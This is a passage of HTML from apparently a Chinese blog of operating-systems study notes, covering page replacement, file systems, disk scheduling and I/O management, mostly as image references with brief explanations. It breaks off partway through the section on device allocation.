class="" title="先进先出置换算法"><h5 id="3-3-6-2-3-最近最久未使用置换算法-LRU"><a href="#3-3-6-2-3-最近最久未使用置换算法-LRU" class="headerlink" title="3.3.6.2.3 最近最久未使用置换算法(LRU)"></a>3.3.6.2.3 最近最久未使用置换算法(LRU)</h5><img src="/posts/d04bd5bc/3.3.6.11.png" class="" title="最近最久未使用置换算法"><h5 id="3-3-6-2-4-时钟置换算法-CLOCK"><a href="#3-3-6-2-4-时钟置换算法-CLOCK" class="headerlink" title="3.3.6.2.4 时钟置换算法(CLOCK)"></a>3.3.6.2.4 时钟置换算法(CLOCK)</h5><img src="/posts/d04bd5bc/3.3.6.12.png" class="" title="简单时钟置换算法"><img src="/posts/d04bd5bc/3.3.6.13.png" class="" title="改进型时钟置换算法"><h4 id="3-3-6-3-页面分配策略"><a href="#3-3-6-3-页面分配策略" class="headerlink" title="3.3.6.3 页面分配策略"></a>3.3.6.3 页面分配策略</h4><img src="/posts/d04bd5bc/3.3.6.14.png" class="" title="页面分配策略"><img src="/posts/d04bd5bc/3.3.6.15.png" class="" title="页面分配策略"><img src="/posts/d04bd5bc/3.3.6.16.png" class="" title="页面分配策略"><img src="/posts/d04bd5bc/3.3.6.17.png" class="" title="页面分配策略"><p>抖动(颠簸)现象：刚刚换出的页面马上又要换入内存，刚刚换入的页面马上又要换出外存，这种频繁的页面调度行为称为抖动，或颠簸。产生抖动的主要原因是进程频繁访问的页面数目高于可用的物理块数(分配给进程的物理块不够)。</p><p>为进程分配的物理块太少，会使进程发生抖动现象。为进程分配的物理块太多，又会降低系统整体的并发度，降低某些资源的利用率。为了研究应该为每个进程分配多少个物理块，Denning提出了进程“工作集”的概念。</p><img src="/posts/d04bd5bc/3.3.6.18.png" class="" title="工作集"><h1 id="4-文件"><a href="#4-文件" class="headerlink" title="4. 文件"></a>4. 文件</h1><p>文件：一组有意义的信息/数据集合。</p><h2 id="4-1-文件的属性"><a href="#4-1-文件的属性" class="headerlink" title="4.1 文件的属性"></a>4.1 文件的属性</h2><p>文件名：由创建文件的用于决定文件名，主要是为了方便用户找到文件，同一目录下不允许有重名文件。</p><p>标识符：一个系统内的各文件标识符唯一，对用户来说毫无可读性，因此标识符只是操作系统用于区分各个文件的一种内部名称。</p><p>类型：指明文件的类型。</p><p>位置：文件的存放路径(让用户使用)、在外存中的地址(操作系统使用，对用户不可见)。</p><p>大小：指明文件的大小。</p><p>保护信息：对文件进行保护的访问控制信息。</p><img src="/posts/d04bd5bc/4.1.png" class="" title="文件内部组织"><img src="/posts/d04bd5bc/4.1.1.png" class="" title="操作系统给文件提供的功能"><p>还有打开文件(open系统调用)和关闭文件(close系统调用)。读/写文件之前，需要“打开文件”，读/写文件结束之后，需要“关闭文件”。</p><p>可用几个基本操作完成更复杂的操作，比如：“复制文件”，先创建一个新的空文件，再把源文件读入内存，再将内存中的数据写到新文件中。</p><img src="/posts/d04bd5bc/4.1.2.png" class="" title="文件存放在外存"><h2 id="4-2-文件的逻辑结构"><a href="#4-2-文件的逻辑结构" class="headerlink" title="4.2 文件的逻辑结构"></a>4.2 文件的逻辑结构</h2><p>所谓的“逻辑结构”，就是指在用户看来，文件内部的数据应该是如何组织起来的。而“物理结构”指的是在操作系统看来，文件的数据是如何存放在外存中的。</p><img src="/posts/d04bd5bc/4.2.1.png" class="" title="有结构文件"><p>根据有结构文件中的各条记录在逻辑上如何组织，可以分为三类：顺序文件、索引文件、索引顺序文件。</p><h3 id="4-2-1-顺序文件"><a href="#4-2-1-顺序文件" class="headerlink" title="4.2.1 顺序文件"></a>4.2.1 顺序文件</h3><img src="/posts/d04bd5bc/4.2.2.png" class="" title="顺序文件"><img src="/posts/d04bd5bc/4.2.3.png" class="" title="顺序文件"><h3 id="4-2-2-索引文件"><a href="#4-2-2-索引文件" class="headerlink" title="4.2.2 索引文件"></a>4.2.2 索引文件</h3><img src="/posts/d04bd5bc/4.2.4.png" class="" title="索引文件"><h3 id="4-2-3-索引顺序文件"><a href="#4-2-3-索引顺序文件" class="headerlink" title="4.2.3 索引顺序文件"></a>4.2.3 索引顺序文件</h3><img src="/posts/d04bd5bc/4.2.5.png" class="" title="索引顺序文件"><img src="/posts/d04bd5bc/4.2.6.png" class="" title="索引顺序文件"><img src="/posts/d04bd5bc/4.2.7.png" class="" title="索引顺序文件"><h2 id="4-3-文件目录"><a href="#4-3-文件目录" class="headerlink" title="4.3 文件目录"></a>4.3 文件目录</h2><p>目录文件中的一条记录就是一个“文件控制块(FCB)”，FCB的有序集合称为“文件目录”。FCB中包含了文件的基本信息(文件名、物理地址、逻辑结构、物理结构等)，存取控制信息(是否可读/可写、禁止访问的用户名单等)，使用信息(如文件的建立时间、修改时间等)。FCB实现了文件名和文件之间的映射，使用户(用户程序)可以实现“按名存取”。所以最重要、最基本的还是文件名、文件存放的物理地址。</p><h3 id="4-3-1-对目录的操作"><a href="#4-3-1-对目录的操作" class="headerlink" title="4.3.1 对目录的操作"></a>4.3.1 对目录的操作</h3><p>搜索：当用户要使用一个文件时，系统要根据文件名搜索目录，找到该文件对应的目录项。</p><p>创建文件：创建一个新文件时，需要在其所属的目录中增加一个目录项。</p><p>删除文件：当删除一个文件时，需要在目录中删除相应的目录项。</p><p>显示目录：用户可以请求显示目录的内容，如显示该目录中的所有文件及相应属性。</p><p>修改目录：某些文件属性保存在目录中，因此这些属性变化时需要修改相应的目录项(如：文件重命名)。</p><h3 id="4-3-2-单级目录结构"><a href="#4-3-2-单级目录结构" class="headerlink" title="4.3.2 单级目录结构"></a>4.3.2 单级目录结构</h3><img src="/posts/d04bd5bc/4.3.2.png" class="" title="单级目录结构"><h3 id="4-3-3-两级目录结构"><a href="#4-3-3-两级目录结构" class="headerlink" title="4.3.3 两级目录结构"></a>4.3.3 两级目录结构</h3><img src="/posts/d04bd5bc/4.3.3.png" class="" title="两级目录结构"><h3 id="4-3-4-多级目录结构"><a href="#4-3-4-多级目录结构" class="headerlink" title="4.3.4 多级目录结构"></a>4.3.4 多级目录结构</h3><img src="/posts/d04bd5bc/4.3.4.png" class="" title="多级目录结构"><img src="/posts/d04bd5bc/4.3.5.png" class="" title="多级目录结构"><p>树形目录结构可以很方便地对文件进行分类，层次结构清晰，也能够更有效地进行文件的管理和保护。但是，树形结构不便于实现文件的共享。为此，提出了“无环图目录结构”。</p><h3 id="4-3-5-无环图目录结构"><a href="#4-3-5-无环图目录结构" class="headerlink" title="4.3.5 无环图目录结构"></a>4.3.5 无环图目录结构</h3><img src="/posts/d04bd5bc/4.3.6.png" class="" title="无环图目录结构"><h3 id="4-3-6-FCB的改进"><a href="#4-3-6-FCB的改进" class="headerlink" title="4.3.6 FCB的改进"></a>4.3.6 FCB的改进</h3><img src="/posts/d04bd5bc/4.3.7.png" class="" title="FCB的改进"><p>当找到文件名对应的目录项时，才需要将索引节点调入内存，索引节点中记录了文件的各种信息，包括文件在外存中的存放位置，根据“存放位置”即可找到文件。</p><p>存放在外存中的索引节点称为“磁盘索引节点”，当索引节点放入内存后称为“内存索引节点”。相比之下，内存索引节点中需要增加一些信息，比如：文件是否被修改、此时有几个进程正在访问该文件等。</p><h2 id="4-4-文件的物理结构-文件分配方式"><a href="#4-4-文件的物理结构-文件分配方式" class="headerlink" title="4.4 文件的物理结构(文件分配方式)"></a>4.4 文件的物理结构(文件分配方式)</h2><img src="/posts/d04bd5bc/4.4.1.png" class="" title="文件块和磁盘块"><h3 id="4-4-1-连续分配"><a href="#4-4-1-连续分配" class="headerlink" title="4.4.1 连续分配"></a>4.4.1 连续分配</h3><p>连续分配方式要求每个文件在磁盘上占有一组连续的块。</p><img src="/posts/d04bd5bc/4.4.2.png" class="" title="连续分配"><p>读取某个磁盘块时，需要移动磁头。访问的两个磁盘块相隔越远，移动磁头所需时间就越长。</p><p>结论：连续分配的文件在顺序读/写时速度最快。</p><img src="/posts/d04bd5bc/4.4.3.png" class="" title="连续分配"><img src="/posts/d04bd5bc/4.4.4.png" class="" title="连续分配"><p>优点：支持顺序访问和直接访问(即随机访问)；连续分配的文件在顺序访问时速度最快。</p><p>缺点：不方便文件拓展；存储空间利用率低，会产生磁盘碎片。</p><h3 id="4-4-2-链式分配"><a href="#4-4-2-链式分配" class="headerlink" title="4.4.2 链式分配"></a>4.4.2 链式分配</h3><p>链式分配采取离散分配的方式，可以为文件分配离散的磁盘块。分为隐式链接和显式链接两种。</p><h4 id="4-4-2-1-隐式链接"><a href="#4-4-2-1-隐式链接" class="headerlink" title="4.4.2.1 隐式链接"></a>4.4.2.1 隐式链接</h4><p>隐式链接：除文件的最后一个盘块之外，每个盘块中都存有指向下一个盘块的指针。文件目录包括文件第一块的指针和最后一块指针。</p><img src="/posts/d04bd5bc/4.4.2.1.png" class="" title="隐式链接"><img src="/posts/d04bd5bc/4.4.2.2.png" class="" title="隐式链接"><p>优点：很方便文件拓展，不会有碎片问题，外存利用率高。</p><p>缺点：只支持顺序访问，不支持随机访问，查找效率低，指向下一个盘块的指针也需要耗费少量的存储空间。</p><h4 id="4-4-2-2-显式链接"><a href="#4-4-2-2-显式链接" class="headerlink" title="4.4.2.2 显式链接"></a>4.4.2.2 显式链接</h4><p>显式链接：把用于链接文件各物理块的指针显式地存放在一张表中，即文件分配表(FAT File Allocation Table)。一个磁盘只会建立一张文件分配表。开机时文件分配表放入内存，并常驻内存。</p><img src="/posts/d04bd5bc/4.4.2.3.png" class="" title="显式链接"><img src="/posts/d04bd5bc/4.4.2.4.png" class="" title="显式链接"><p>优点：很方便文件拓展，不会有碎片问题，外存利用率高，并且支持随机访问。相比于隐式链接来说，地址转换时不需要访问磁盘，因此文件的访问效率更高。</p><p>缺点：文件分配表需要占用一定的存储空间。</p><h3 id="4-4-3-索引分配"><a href="#4-4-3-索引分配" class="headerlink" title="4.4.3 索引分配"></a>4.4.3 索引分配</h3><img src="/posts/d04bd5bc/4.4.3.1.png" class="" title="索引分配"><p>如何实现文件的逻辑块号到物理块号的转换？</p><p>用户给出要访问的逻辑块号i操作系统找到该文件对应的目录项(FCB)。从目录项中可知索引表存放位置，将索引表从外存读入内存，并查找索引表即可知道i号逻辑块在外存中的存放位置。</p><p>可见，索引分配方式可以支持随机访问。文件拓展也很容易实现(只需要给文件分配一个空闲块，并增加一个索引表项即可)，但是索引表需要占用一定的存储空间。</p><p>若每个磁盘块1KB，一个索引表项4B，则一个磁盘块只能存放1KB/4B=256个索引项。如果一个文件的大小超过了256块，那么一个磁盘块是装不下文件的整张索引表的，如何解决这个问题？</p><p>方法一：链接方案</p><img src="/posts/d04bd5bc/4.4.3.2.png" class="" title="链接方案"><p>方法二：多层索引</p><img src="/posts/d04bd5bc/4.4.3.3.png" class="" title="多层索引"><p>方法三：混合索引</p><img src="/posts/d04bd5bc/4.4.3.4.png" class="" title="混合索引"><h2 id="4-5-文件存储空间管理"><a href="#4-5-文件存储空间管理" class="headerlink" title="4.5 文件存储空间管理"></a>4.5 文件存储空间管理</h2><img src="/posts/d04bd5bc/4.5.1.png" class="" title="存储空间的划分"><h3 id="4-5-1-空闲表法"><a href="#4-5-1-空闲表法" class="headerlink" title="4.5.1 空闲表法"></a>4.5.1 空闲表法</h3><img src="/posts/d04bd5bc/4.5.2.png" class="" title="空闲表法"><h3 id="4-5-2-空闲链表法"><a href="#4-5-2-空闲链表法" class="headerlink" title="4.5.2 空闲链表法"></a>4.5.2 空闲链表法</h3><img src="/posts/d04bd5bc/4.5.3.png" class="" title="空闲链表法"><img src="/posts/d04bd5bc/4.5.4.png" class="" title="空闲链表法"><img src="/posts/d04bd5bc/4.5.5.png" class="" title="空闲链表法"><h3 id="4-5-3-位示图法"><a href="#4-5-3-位示图法" class="headerlink" title="4.5.3 位示图法"></a>4.5.3 位示图法</h3><img src="/posts/d04bd5bc/4.5.6.png" class="" title="位示图法"><p>如何分配：若文件需要K个块，①顺序扫描位示图，找到K个相邻或不相邻的“0”；②根据字号、位号算出对应的盘块号，将相应盘块分配给文件；③将相应位设置为“1”。</p><p>如何回收：①根据回收的盘块号计算出对应的字号、位号；②将相应二进制位设为“0”。</p><p>位示图法连续分配、离散分配都适用。</p><h3 id="4-5-4-成组链接法"><a href="#4-5-4-成组链接法" class="headerlink" title="4.5.4 成组链接法"></a>4.5.4 成组链接法</h3><img src="/posts/d04bd5bc/4.5.7.png" class="" title="成组链接法"><img src="/posts/d04bd5bc/4.5.8.png" class="" title="成组链接法"><img src="/posts/d04bd5bc/4.5.9.png" class="" title="成组链接法"><img src="/posts/d04bd5bc/4.5.10.png" class="" title="成组链接法"><h2 id="4-6-文件的基本操作"><a href="#4-6-文件的基本操作" class="headerlink" title="4.6 文件的基本操作"></a>4.6 文件的基本操作</h2><h3 id="4-6-1-创建文件"><a href="#4-6-1-创建文件" class="headerlink" title="4.6.1 创建文件"></a>4.6.1 创建文件</h3><p>进行create系统调用时，需要提供的几个主要参数：</p><ol><li>所需的外存空间大小(如：一个盘块，即1KB)</li><li>文件存放路径(“D:\Demo”)</li><li>文件名(默认为“新建文本文档.txt”)</li></ol><p>操作系统在处理create系统调用时，主要做了两件事：</p><ol><li>在外存中找到文件所需的空间(结合4.5，找到空闲空间)</li><li>根据文件存放路径的信息找到该目录对应的目录文件(“D:\Demo”)，在目录中创建该文件对应的目录项。目录项中包含了文件名、文件在外存中的存放位置等信息</li></ol><h3 id="4-6-2-删除文件"><a href="#4-6-2-删除文件" class="headerlink" title="4.6.2 删除文件"></a>4.6.2 删除文件</h3><p>进行delete系统调用时，需要提供的几个主要参数：</p><ol><li>文件存放路径(“D:\Demo”)</li><li>文件名(“test.txt”)</li></ol><p>操作系统在处理delete系统调用时，主要做了几件事：</p><ol><li>根据文件存放路径找到相应的目录文件，从目录中找到文件名对应的目录项</li><li>根据该目录项记录的文件在外存的存放位置、文件大小等信息，回收文件占用的磁盘块(回收磁盘块时，根据空闲表法、空闲链表法、位图法等管理策略的不同，需要做不同的处理)</li><li>从目录表中删除文件对应的目录项</li></ol><h3 id="4-6-3-打开文件"><a href="#4-6-3-打开文件" class="headerlink" title="4.6.3 打开文件"></a>4.6.3 打开文件</h3><p>在很多操作系统中，在对文件进行操作之前，要求用户先使用open系统调用“打开文件”，需要提供的几个主要参数：</p><ol><li>文件存放路径(“D:\Demo”)</li><li>文件名(“test.txt”)</li><li>要对文件的操作类型(如：r只读；rw读写等)</li></ol><p>操作系统在处理open系统调用时，主要做了几件事：</p><ol><li>根据文件存放路径找到相应的目录文件，从目录中找到文件名对应的目录项，并检查该用户是否有特定的操作权限</li><li>将目录项复制到内存中的“打开文件表”中。并将对应表目的编号返回给用户。之后用户使用打开文件表的编号来指明要操作的文件</li></ol><img src="/posts/d04bd5bc/4.6.3.png" class="" title="打开文件"><h3 id="4-6-4-关闭文件"><a href="#4-6-4-关闭文件" class="headerlink" title="4.6.4 关闭文件"></a>4.6.4 关闭文件</h3><img src="/posts/d04bd5bc/4.6.4.png" class="" title="关闭文件"><h3 id="4-6-5-读文件"><a href="#4-6-5-读文件" class="headerlink" title="4.6.5 读文件"></a>4.6.5 读文件</h3><img src="/posts/d04bd5bc/4.6.5.png" class="" title="读文件"><h3 id="4-6-6-写文件"><a href="#4-6-6-写文件" class="headerlink" title="4.6.6 写文件"></a>4.6.6 写文件</h3><img src="/posts/d04bd5bc/4.6.6.png" class="" title="写文件"><h2 id="4-7-文件共享"><a href="#4-7-文件共享" class="headerlink" title="4.7 文件共享"></a>4.7 文件共享</h2><img src="/posts/d04bd5bc/4.7.1.png" class="" title="文件共享"><h3 id="4-7-1-基于索引节点的共享方式-硬链接"><a href="#4-7-1-基于索引节点的共享方式-硬链接" class="headerlink" title="4.7.1 基于索引节点的共享方式(硬链接)"></a>4.7.1 基于索引节点的共享方式(硬链接)</h3><img src="/posts/d04bd5bc/4.7.2.png" class="" title="硬链接"><h3 id="4-7-2-基于符号链的共享方式-软链接"><a href="#4-7-2-基于符号链的共享方式-软链接" class="headerlink" title="4.7.2 基于符号链的共享方式(软链接)"></a>4.7.2 基于符号链的共享方式(软链接)</h3><img src="/posts/d04bd5bc/4.7.3.png" class="" title="软链接"><p>由于用软链接的方式访问共享文件时要查询多级目录，会有多次磁盘I/O，因此用软链接访问比硬链接速度慢。</p><h2 id="4-8-文件保护"><a href="#4-8-文件保护" class="headerlink" title="4.8 文件保护"></a>4.8 文件保护</h2><h3 id="4-8-1-口令保护"><a href="#4-8-1-口令保护" class="headerlink" title="4.8.1 口令保护"></a>4.8.1 口令保护</h3><img src="/posts/d04bd5bc/4.8.1.png" class="" title="口令保护"><h3 id="4-8-2-加密保护"><a href="#4-8-2-加密保护" class="headerlink" title="4.8.2 加密保护"></a>4.8.2 加密保护</h3><img src="/posts/d04bd5bc/4.8.2.png" class="" title="加密保护"><h3 id="4-8-3-访问控制"><a href="#4-8-3-访问控制" class="headerlink" title="4.8.3 访问控制"></a>4.8.3 访问控制</h3><img src="/posts/d04bd5bc/4.8.3.png" class="" title="访问控制"><img src="/posts/d04bd5bc/4.8.4.png" class="" title="访问控制"><h2 id="4-9-文件系统的层次结构"><a href="#4-9-文件系统的层次结构" class="headerlink" title="4.9 文件系统的层次结构"></a>4.9 文件系统的层次结构</h2><img src="/posts/d04bd5bc/4.9.1.png" class="" title="文件系统的层次结构"><img src="/posts/d04bd5bc/4.9.2.png" class="" title="文件系统的层次结构"><h2 id="4-10-磁盘的结构"><a href="#4-10-磁盘的结构" class="headerlink" title="4.10 磁盘的结构"></a>4.10 磁盘的结构</h2><p>磁盘的表面由一些磁性物质组成，可以用这些磁性物质来记录二进制数据。磁盘的盘面被划分成一个个磁道。一个磁道又被划分成一个个扇区，每个扇区就是一个“磁盘块”，各个扇区存放的数据量相同(如1KB)。</p><p>最内侧磁道上的扇区面积最小，因此数据密度最大。</p><img src="/posts/d04bd5bc/4.10.7.png" class="" title="磁盘的物理地址"><img src="/posts/d04bd5bc/4.10.7.png" class="" title="磁盘的分类"><p>盘片可以更换的称为可换盘磁盘；不可更换的称为固定盘磁盘。</p><h2 id="4-11-磁盘调度算法"><a href="#4-11-磁盘调度算法" class="headerlink" title="4.11 磁盘调度算法"></a>4.11 磁盘调度算法</h2><p>磁盘调度算法是为了提高磁盘的访问性能，一般是通过优化磁盘的访问请求顺序来做的。其中寻道是磁盘较为耗时的部分，因此如果请求顺序得当，可以节省一些不必要的寻道时间。</p><img src="/posts/d04bd5bc/4.10.png" class="" title="磁盘读写需要的时间"><h3 id="4-11-1-先来先服务算法-FCFS"><a href="#4-11-1-先来先服务算法-FCFS" class="headerlink" title="4.11.1 先来先服务算法(FCFS)"></a>4.11.1 先来先服务算法(FCFS)</h3><img src="/posts/d04bd5bc/4.10.1.png" class="" title="先来先服务算法"><h3 id="4-11-2-最短寻找时间优先-SSTF"><a href="#4-11-2-最短寻找时间优先-SSTF" class="headerlink" title="4.11.2 最短寻找时间优先(SSTF)"></a>4.11.2 最短寻找时间优先(SSTF)</h3><img src="/posts/d04bd5bc/4.10.2.png" class="" title="最短寻找时间优先"><h3 id="4-11-3-扫描算法-SCAN"><a href="#4-11-3-扫描算法-SCAN" class="headerlink" title="4.11.3 扫描算法(SCAN)"></a>4.11.3 扫描算法(SCAN)</h3><img src="/posts/d04bd5bc/4.10.3.png" class="" title="扫描算法"><h3 id="4-11-4-LOOK调度算法"><a href="#4-11-4-LOOK调度算法" class="headerlink" title="4.11.4 LOOK调度算法"></a>4.11.4 LOOK调度算法</h3><img src="/posts/d04bd5bc/4.10.4.png" class="" title="LOOK调度算法"><h3 id="4-11-5-循环扫描算法-C-SCAN"><a href="#4-11-5-循环扫描算法-C-SCAN" class="headerlink" title="4.11.5 循环扫描算法(C-SCAN)"></a>4.11.5 循环扫描算法(C-SCAN)</h3><img src="/posts/d04bd5bc/4.10.5.png" class="" title="循环扫描算法"><h3 id="4-11-6-C-LOOK调度算法"><a href="#4-11-6-C-LOOK调度算法" class="headerlink" title="4.11.6 C-LOOK调度算法"></a>4.11.6 C-LOOK调度算法</h3><img src="/posts/d04bd5bc/4.10.6.png" class="" title="C-LOOK调度算法"><h2 id="4-12-减少磁盘延迟时间的方法"><a href="#4-12-减少磁盘延迟时间的方法" class="headerlink" title="4.12 减少磁盘延迟时间的方法"></a>4.12 减少磁盘延迟时间的方法</h2><img src="/posts/d04bd5bc/4.11.1.png" class="" title="磁盘读写需要的时间"><h3 id="4-12-1-交替编号"><a href="#4-12-1-交替编号" class="headerlink" title="4.12.1 交替编号"></a>4.12.1 交替编号</h3><p>若采用交替编号的策略，即让逻辑上相邻的扇区在物理上有一定的间隔，可以使读取连续的逻辑扇区所需要的延迟时间更小。</p><h3 id="4-12-2-错位命名"><a href="#4-12-2-错位命名" class="headerlink" title="4.12.2 错位命名"></a>4.12.2 错位命名</h3><img src="/posts/d04bd5bc/4.11.5.png" class="" title="错位命名"><img src="/posts/d04bd5bc/4.11.6.png" class="" title="错位命名"><h3 id="4-12-3-磁盘地址结构的设计"><a href="#4-12-3-磁盘地址结构的设计" class="headerlink" title="4.12.3 磁盘地址结构的设计"></a>4.12.3 磁盘地址结构的设计</h3><img src="/posts/d04bd5bc/4.11.2.png" class="" title="磁盘地址结构的设计"><img src="/posts/d04bd5bc/4.11.3.png" class="" title="磁盘地址结构的设计"><img src="/posts/d04bd5bc/4.11.4.png" class="" title="磁盘地址结构的设计"><h2 id="4-13-磁盘的管理"><a href="#4-13-磁盘的管理" class="headerlink" title="4.13 磁盘的管理"></a>4.13 磁盘的管理</h2><img src="/posts/d04bd5bc/4.12.1.png" class="" title="磁盘初始化"><img src="/posts/d04bd5bc/4.12.2.png" class="" title="引导块"><img src="/posts/d04bd5bc/4.12.3.png" class="" title="坏块"><h1 id="5-I-O"><a href="#5-I-O" class="headerlink" title="5. I/O"></a>5. I/O</h1><h2 id="5-1-I-O设备基本概念"><a href="#5-1-I-O设备基本概念" class="headerlink" title="5.1 I/O设备基本概念"></a>5.1 I/O设备基本概念</h2><p>I/O就是输入/输出。I/O设备就是可以将数据输入到计算机，或者可以接收计算机输出数据的外部设备，属于计算机中的硬件部件。</p><p>UNIX系统将外部设备抽象为一种特殊的文件，用户可以使用与文件操作相同的方式对外部设备进行操作。</p><p>Write操作：向外部设备写出数据。</p><p>Read操作：从外部设备读入数据。</p><script type="math/tex; mode=display">I/O设备按使用特性分类\begin{cases}人机交互类外部设备：数据传输速度慢\\\\存储设备：数据传输速度快\\\\网络通信设备：数据传输速度介于上述二者之间\end{cases}</script><p>人机交互类外设：鼠标、键盘、打印机等——用于人机交互</p><p>存储设备：移动硬盘、光盘等——用于数据存储</p><p>网络通信设备：调制解调器等——用于网络通信</p><img src="/posts/d04bd5bc/5.1.1.png" class="" title="I/O设备分类"><img src="/posts/d04bd5bc/5.1.2.png" class="" title="I/O设备分类"><h2 id="5-2-I-O控制器"><a href="#5-2-I-O控制器" class="headerlink" title="5.2 I/O控制器"></a>5.2 I/O控制器</h2><p>I/O设备的机械部件主要用来执行具体的I/O操作。如我们看得见摸得着的鼠标/键盘的按钮；显示器的LED屏；移动硬盘的磁臂、磁盘盘面。</p><p>I/O设备的电子部件通常是一块插入主板扩充槽的印刷电路板。</p><img src="/posts/d04bd5bc/5.2.1.png" class="" title="I/O控制器"><img src="/posts/d04bd5bc/5.2.2.png" class="" title="I/O控制器的组成"><p>值得注意的小细节：</p><ol><li>一个I/O控制器可能会对应多个设备</li><li>数据寄存器、控制寄存器、状态寄存器可能有多个(如：每个控制/状态寄存器对应一个具体的设备)，且这些寄存器都要有相应的地址，才能方便CPU操作。有的计算机会让这些寄存器占用内存地址的一部分，称为内存映像I/O；另一些计算机则采用I/O专用地址，即寄存器独立编址</li></ol><img src="/posts/d04bd5bc/5.2.3.png" class="" title="两种寄存器编制方式"><h2 id="5-3-I-O控制方式"><a href="#5-3-I-O控制方式" class="headerlink" title="5.3 I/O控制方式"></a>5.3 I/O控制方式</h2><img src="/posts/d04bd5bc/5.3.png" class="" title="I/O控制方式"><h3 id="5-3-1-程序直接控制方式"><a href="#5-3-1-程序直接控制方式" class="headerlink" title="5.3.1 程序直接控制方式"></a>5.3.1 程序直接控制方式</h3><img src="/posts/d04bd5bc/5.3.1.png" class="" title="程序直接控制方式"><img src="/posts/d04bd5bc/5.3.2.png" class="" title="程序直接控制方式"><h3 id="5-3-2-中断驱动方式"><a href="#5-3-2-中断驱动方式" class="headerlink" title="5.3.2 中断驱动方式"></a>5.3.2 中断驱动方式</h3><img src="/posts/d04bd5bc/5.3.3.png" class="" title="中断驱动方式"><img src="/posts/d04bd5bc/5.3.4.png" class="" title="中断驱动方式"><h3 id="5-3-3-DMA方式"><a href="#5-3-3-DMA方式" class="headerlink" title="5.3.3 DMA方式"></a>5.3.3 DMA方式</h3><img src="/posts/d04bd5bc/5.3.5.png" class="" title="DMA方式"><img src="/posts/d04bd5bc/5.3.6.png" class="" title="DMA方式"><img src="/posts/d04bd5bc/5.3.7.png" class="" title="DMA方式"><h3 id="5-3-4-通道控制方式"><a href="#5-3-4-通道控制方式" class="headerlink" title="5.3.4 通道控制方式"></a>5.3.4 通道控制方式</h3><img src="/posts/d04bd5bc/5.3.8.png" class="" title="通道控制方式"><img src="/posts/d04bd5bc/5.3.9.png" class="" title="通道控制方式"><h2 id="5-4-I-O软件层次结构"><a href="#5-4-I-O软件层次结构" class="headerlink" title="5.4 I/O软件层次结构"></a>5.4 I/O软件层次结构</h2><img src="/posts/d04bd5bc/5.4.png" class="" title="I/O软件层次结构"><h3 id="5-4-1-用户层软件"><a href="#5-4-1-用户层软件" class="headerlink" title="5.4.1 用户层软件"></a>5.4.1 用户层软件</h3><img src="/posts/d04bd5bc/5.4.1.png" class="" title="用户层软件"><p>假脱机技术(SPOOLing技术)在用户层软件实现。</p><h3 id="5-4-2-设备独立性软件"><a href="#5-4-2-设备独立性软件" class="headerlink" title="5.4.2 设备独立性软件"></a>5.4.2 设备独立性软件</h3><p>设备独立性软件，又称设备无关性软件。与设备的硬件特性无关的功能几乎都在这一层实现。</p><p>主要实现的功能：</p><ol><li>向上层提供统一的调用接口(如read/write系统调用)</li><li>设备的保护(原理类似于文件保护)</li><li>差错处理</li><li>设备的分配与回收</li><li>数据缓冲区管理，可以通过缓冲技术屏蔽设备之间数据交换单位大小和传输速度的差异</li><li>建立逻辑设备名到物理设备名的映射关系；根据设备类型选择调用相应的驱动程序</li></ol><p>设备独立性软件需要通过“逻辑设备表(LUT，Logical Unit Table)”来确定逻辑设备对应的物理设备，并找到该设备对应的设备驱动程序。</p><p>操作系统可以采用两种方式管理逻辑设备表：</p><p>第一种方式，整个系统只设置一张LUT，这就意味着所有用户不能使用相同的逻辑设备名，因此这种方式只适用于单用户操作系统。</p><p>第二种方式，为每个用户设置一张LUT，各个用户使用的逻辑设备名可以重复，适用于多用户操作系统。系统会在用户登录时为其建立一个用户管理进程，而LUT就存放在用户管理进程的PCB中。</p><h3 id="5-4-3-设备驱动程序"><a href="#5-4-3-设备驱动程序" class="headerlink" title="5.4.3 设备驱动程序"></a>5.4.3 设备驱动程序</h3><img src="/posts/d04bd5bc/5.4.3.png" class="" title="设备驱动程序"><h3 id="5-4-4-中断处理程序"><a href="#5-4-4-中断处理程序" class="headerlink" title="5.4.4 中断处理程序"></a>5.4.4 中断处理程序</h3><img src="/posts/d04bd5bc/5.4.4.png" class="" title="中断处理程序"><p>I/O核心子系统提供的功能：I/O调度、设备保护、设备分配与回收、缓冲区管理(即缓冲与高速缓存)。</p><h3 id="5-4-5-硬件"><a href="#5-4-5-硬件" class="headerlink" title="5.4.5 硬件"></a>5.4.5 硬件</h3><p>执行I/O操作，由机械部件、电子部件组成。(看5.2)</p><h2 id="5-5-假脱机技术"><a href="#5-5-假脱机技术" class="headerlink" title="5.5 假脱机技术"></a>5.5 假脱机技术</h2><p>脱机——脱离主机的控制进行的输入/输出操作。</p><img src="/posts/d04bd5bc/5.5.1.png" class="" title="输入井和输出井"><img src="/posts/d04bd5bc/5.5.2.png" class="" title="输入输出缓冲区"><p>独占式设备——只允许各个进程串行使用的设备。一段时间内只能满足一个进程的请求。</p><p>共享设备——允许多个进程“同时”使用的设备(宏观上同时使用，微观上可能是交替使用)。可以同时满足多个进程的使用请求。</p><p>打印机是种“独占式设备”，但是可以用SPOOLing技术改造成“共享设备”。</p><p>独占式设备的例子：若进程1正在使用打印机，则进程2请求使用打印机时必然阻塞等待。</p><img src="/posts/d04bd5bc/5.5.3.png" class="" title="共享打印机"><img src="/posts/d04bd5bc/5.5.4.png" class="" title="共享打印机"><h2 id="5-6-设备的分配与回收"><a href="#5-6-设备的分配与回收" class="headerlink" title="5.6 设备的分配与回收"></a>5.6 设备的分配与回收</h2><p>虚拟设备——采用SPOOLing技术将独占设备改造成虚拟的共享设备，可同时分配给多个进程使用(如采用SPOOLing技术实现的共享打印机)</p><p>从进程运行的安全性上考虑，设备分配有两种方式：</p><ul><li><p>安全分配方式：为进程分配一个设备后就将进程阻塞，本次I/O完成后才将进程唤醒</p><p>一个时段内每个进程只能使用一个设备</p><p>优点：破坏了“请求和保持”条件，不会死锁</p><p>缺点：对于一个进程来说，CPU和I/O设备只能串行工作</p></li><li><p>不安全分配方式：进程发出I/O请求后，系统为其分配I/O设备，进程可继续执行，之后还可以发出新的I/O请求。只有某个I/O请求得不到满足时才将进程阻塞</p><p>一个进程可以同时使用多个设备</p><p>优点：进程的计算任务和I/O任务可以并行处理，使进程迅速推进</p><p>缺点：有可能发生死锁(死锁避免、死锁的检测和解除)</p></li></ul><p>静态分配：进程运行前为其分配全部所需资源，运行结束后归还资源。破坏了“请求和保持”条件，不会发生死锁。</p><p>动态分配：进程运行过程中动态申请设备资源。</p><h3 id="5-6-1-设备分配管理中的数据结构"><a href="#5-6-1-设备分配管理中的数据结构" class="headerlink" 